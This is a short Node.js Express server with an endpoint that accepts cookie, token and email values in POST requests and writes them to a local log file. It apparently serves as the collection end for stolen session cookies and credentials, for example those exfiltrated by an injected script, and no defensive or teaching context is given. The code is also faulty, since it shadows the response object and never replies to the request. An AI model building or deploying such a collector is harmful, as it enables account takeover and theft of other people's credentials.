const express = require('express');
const app = express();
const path = require('path');
const fs = require('fs');

app.use(express.urlencoded());
app.use(express.json());

app.get('/',function(req,res){
  res.sendFile(path.join(__dirname+'/index.html'));
});

app.post('/data', function(req, res){
  var res = req.body.cookie + " " + req.body.token + " " + req.body.email;
  fs.writeFile('log', res, (err) => { if (err) throw err; });
});

app.listen(3000);
